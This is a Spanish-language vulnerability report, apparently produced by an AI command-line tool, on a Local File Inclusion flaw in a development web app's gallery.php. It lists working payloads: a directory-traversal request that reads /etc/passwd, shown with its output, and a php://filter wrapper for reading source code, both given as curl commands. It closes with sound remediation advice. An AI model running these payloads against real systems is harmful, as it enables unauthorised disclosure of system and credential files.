# Informe de análisis LFI

Fecha: 2026-04-18T18:02:09Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad de Local File Inclusion (LFI) en la aplicación.

Vulnerabilidad
--------------
- Endpoint vulnerable: /gallery.php
- Parámetro vulnerable: page
- Vector probado: directory traversal y wrappers PHP

Prueba de concepto (extracto)
-----------------------------
Petición utilizada:
- http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd

Respuesta (fragmento obtenido):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...

Ejecución / explotación
-----------------------
Se obtuvo lectura del fichero /etc/passwd usando traversal: la inclusión directa mostró el contenido del archivo en la respuesta. También se probaron wrappers php://filter para intentar leer/obtener código fuente (base64) de ficheros PHP.

Impacto
-------
- Divulgación de ficheros locales (información sensible de sistema y usuarios).
- Si existen ficheros con configuraciones o credenciales accesibles, riesgo de escalado.

Recomendaciones
---------------
1. Evitar incluir archivos directamente a partir de entrada del usuario. Implementar un mapeo (whitelist) fijo de nombres de "page" a rutas del servidor.
2. Normalizar y validar la entrada: rechazar cualquier ruta que contenga ".." o separadores inesperados; usar realpath y comparar con un directorio raíz permitido.
3. Desactivar directivas peligrosas en PHP (si aplica): allow_url_include, allow_url_fopen dependiendo del contexto.
4. Restringir permisos de archivos sensibles y minimizar datos en ficheros accesibles por el servidor web.
5. Registrar intentos y alertar sobre parámetros con traversal.

Comandos usados
---------------
- curl "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
- curl "http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=index.php"

Conclusión
----------
Vulnerabilidad confirmada y explotada con éxito. Se recomienda aplicar las mitigaciones indicadas y revisar el código de inclusión en gallery.php.


Informe generado por: Copilot CLI (GPT-5 mini)
